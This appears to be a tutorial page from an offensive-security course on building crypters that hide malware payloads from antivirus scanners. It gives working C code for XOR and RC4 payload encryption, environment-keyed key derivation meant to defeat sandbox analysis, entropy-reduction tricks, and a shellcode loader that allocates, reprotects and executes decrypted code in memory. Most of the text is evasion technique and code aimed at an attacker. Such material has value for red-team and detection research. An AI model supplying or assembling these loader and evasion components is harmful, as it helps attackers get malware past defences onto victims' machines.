---
layout: page
title: "Crypters: Hiding Payloads on Disk"
---

# Crypters: Hiding Payloads on Disk

Signature-based detection and heuristic analysis operate on one assumption: the payload exists in a readable form on disk. A crypter breaks that assumption. The malicious code is encrypted at rest. What lands on disk is opaque data. The AV engine has no byte sequence to match, no import table to analyze, no recognizable structure to flag. The payload only materializes in memory, at runtime, inside the decryption stub.

This is why crypters are the most effective on-disk evasion technique. Not because they are complex, but because they directly invalidate the premise that static analysis depends on.

## Anatomy of a Crypter

A crypter has two components: the encrypted payload and the decryption stub. The stub is compiled code. The encrypted payload is a binary blob embedded in the stub's data section, or appended to it, or fetched from a remote location.

```
+---------------------------+
|   Decryption Stub         |  <- legitimate-looking PE, small import table
|   - decrypt()             |
|   - allocate memory       |
|   - copy payload          |
|   - execute               |
+---------------------------+
|   Encrypted Payload Blob  |  <- opaque bytes, no structure visible to AV
+---------------------------+
```

At runtime, the stub runs first. It decrypts the blob, writes the result into executable memory, and transfers control to it. From the AV's perspective scanning the file on disk, the stub is a small program with no suspicious imports and the payload is indistinguishable from random data.

## XOR: The Foundation

XOR is the simplest encryption primitive. Every byte of the payload is XORed against a key byte. The key cycles if the payload is longer than the key.

```c
void xor_crypt(uint8_t *buf, size_t len, uint8_t *key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}
```

Encryption and decryption are the same operation. XOR the ciphertext with the same key and you recover the plaintext.

Single-byte XOR is worthless against any modern engine. The output produces a recognizable statistical distribution and the key is recoverable by frequency analysis. Multi-byte keys are better, but the fundamental problem remains: if the key is a static value embedded in the binary, static analysis extracts it and decrypts the payload without executing anything.

The entropy of XOR-encrypted data is also a problem. XOR with a short repeating key produces low-entropy output. Sections with entropy below ~7.0 bits per byte look suspiciously uniform. Sections with entropy above ~7.5 look suspiciously random. Both extremes attract heuristic scrutiny. AES-encrypted data clusters near the maximum of 8.0, which is itself a flag for many engines.

XOR is useful as a first layer or combined with encoding. Alone, it is not sufficient.

## RC4: Practical Robustness

RC4 produces higher-quality pseudorandom output than short-key XOR. It operates in two phases: the Key Scheduling Algorithm (KSA) initializes a 256-byte state array using the key, and the Pseudo-Random Generation Algorithm (PRGA) generates a keystream one byte at a time.

```c
typedef struct {
    uint8_t S[256];
    uint8_t i;
    uint8_t j;
} rc4_ctx_t;

void rc4_init(rc4_ctx_t *ctx, uint8_t *key, size_t key_len) {
    for (int i = 0; i < 256; i++)
        ctx->S[i] = i;

    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) % 256;
        uint8_t tmp = ctx->S[i];
        ctx->S[i]   = ctx->S[j];
        ctx->S[j]   = tmp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

uint8_t rc4_byte(rc4_ctx_t *ctx) {
    ctx->i = (ctx->i + 1) % 256;
    ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;

    uint8_t tmp    = ctx->S[ctx->i];
    ctx->S[ctx->i] = ctx->S[ctx->j];
    ctx->S[ctx->j] = tmp;

    return ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
}

void rc4_crypt(uint8_t *buf, size_t len, uint8_t *key, size_t key_len) {
    rc4_ctx_t ctx;
    rc4_init(&ctx, key, key_len);
    for (size_t i = 0; i < len; i++)
        buf[i] ^= rc4_byte(&ctx);
}
```

RC4 output is statistically uniform, which means the encrypted blob produces high, consistent entropy across all byte values. This looks like random data to a signature scanner, which cannot distinguish it from padding or compressed content.

The limitation is the same as XOR at the key level: a static key embedded in the binary is extractable. The stub can be analyzed, the key recovered, the payload decrypted offline.

## AES: Maximum Robustness

AES-256 in CBC mode is the most robust option for payload encryption. The block cipher produces indistinguishable ciphertext, the key space is computationally infeasible to brute force, and the initialization vector (IV) ensures identical plaintexts produce different ciphertexts across encryptions.

Using the Windows CryptoAPI keeps the stub clean of suspicious code patterns, but imports `Advapi32.dll` and exposes `CryptDecrypt`, `CryptImportKey`, and `CryptAcquireContext`, which heuristic engines score as suspicious in combination.

A manual AES implementation avoids those imports at the cost of a larger stub. The trade-off depends on the target environment. Against signature-only scanners, either approach works. Against heuristic engines scoring imports, the manual implementation wins.

The IV must be unique per encryption and transmitted alongside the ciphertext. The standard approach is to prepend the IV to the encrypted blob:

```
[  16 bytes IV  |  AES-CBC encrypted payload  ]
```

The stub reads the first 16 bytes as the IV, then decrypts the remainder.

## Key Derivation at Runtime

Embedding a static key in the stub is the critical weakness of every crypter. The sandbox does not need to execute your code to recover the key. It can extract the key from the binary, decrypt the payload, and analyze it statically.

Runtime key derivation eliminates that attack surface. The key is not stored in the binary. It is computed at runtime from properties of the execution environment that are unpredictable to the sandbox but stable on the target machine.

```c
#include <windows.h>
#include <stdint.h>
#include <string.h>

void derive_key(uint8_t *key_out, size_t key_len) {
    char  hostname[256] = {0};
    DWORD serial        = 0;
    DWORD hostname_len  = sizeof(hostname);

    GetComputerNameA(hostname, &hostname_len);
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);

    // Combine into a seed buffer
    uint8_t seed[260] = {0};
    memcpy(seed, &serial, sizeof(DWORD));
    memcpy(seed + sizeof(DWORD), hostname, strlen(hostname));

    size_t seed_len = sizeof(DWORD) + strlen(hostname);
    for (size_t i = 0; i < key_len; i++) {
        key_out[i] = seed[i % seed_len] ^ (uint8_t)(i * 0x5f);
    }
}
```

During payload preparation, you compute the key using the same derivation logic against the known target environment, encrypt the payload, and embed the ciphertext in the stub. The stub derives the key at runtime and decrypts. On any machine that is not the target, the key is different, the decryption fails, and the payload never appears in memory.

The trade-off: you need to know the target's hostname and volume serial number before generating the crypter. In an engagement, this information comes from initial reconnaissance or from a first-stage payload. It is incompatible with generic phishing campaigns targeting arbitrary machines.

## Entropy and Heuristic Detection

AES and RC4 output produces entropy near 8.0 bits per byte, which is the theoretical maximum for a uniform random distribution. Heuristic engines flag sections with entropy above ~7.2 as suspicious, particularly in executables where high-entropy data has no obvious legitimate explanation.

The mitigation is encoding the encrypted blob before embedding it in the stub. Base64 encoding reduces apparent entropy by expanding the ciphertext into a limited character set. The stub decodes before decrypting.

```
Encoding pipeline:
  plaintext -> AES-256-CBC -> base64 -> embedded in stub

Decryption pipeline at runtime:
  embedded blob -> base64 decode -> AES-256-CBC decrypt -> shellcode
```

Base64-encoded data produces entropy around 6.0, well below the threshold that triggers heuristic flags. The cost is a 33% size increase in the blob, which is irrelevant for shellcode payloads.

Custom encoding schemes reduce entropy further and avoid the recognizable base64 alphabet, which is itself a detectable pattern. A practical approach: map each byte to a two-character sequence using a shuffled lookup table embedded in the stub.

## The Execution Flow

How the decrypted payload reaches execution matters as much as how it is decrypted. Allocating memory with `PAGE_EXECUTE_READWRITE` in a single call is one of the strongest heuristic signals an AV engine can observe. It signals that shellcode is about to be written and executed at that address.

The correct approach separates the operations:

```c
#include <windows.h>

void execute_payload(uint8_t *payload, size_t payload_len) {
    // 1. Allocate RW memory -- no execute permission yet
    LPVOID mem = VirtualAlloc(
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!mem) return;

    // 2. Copy decrypted payload into the RW region
    memcpy(mem, payload, payload_len);

    // 3. Change permissions to RX -- remove write, add execute
    DWORD old_protect;
    VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &old_protect);

    // 4. Execute
    ((void(*)())mem)();
}
```

This pattern (allocate RW, write, protect RX, execute) avoids the single-call RWX flag that triggers immediate heuristic hits in most engines. It also mirrors what legitimate loaders do, which matters for ML-based detection comparing behavioral similarity to known-good software.

## Where Crypters Stop Working

A crypter defeats disk-based detection. It does nothing for the behavioral layer.

The sandbox does not care what the payload looks like on disk. It executes the stub, watches the decryption happen in real time, and analyzes what the payload does after it surfaces in memory. The allocation sequence, the VirtualProtect call, the transfer of execution to a freshly allocated region: all of it is logged and scored.

A crypter with runtime key derivation defeats the sandbox's ability to decrypt the payload offline. But if the sandbox's environment happens to satisfy the derivation conditions, or if you did not implement derivation at all, the payload decrypts, executes, and behavioral detection catches it.

On-disk evasion and in-memory evasion solve different problems. A crypter gets the payload past the scanner. What happens after execution requires its own approach.
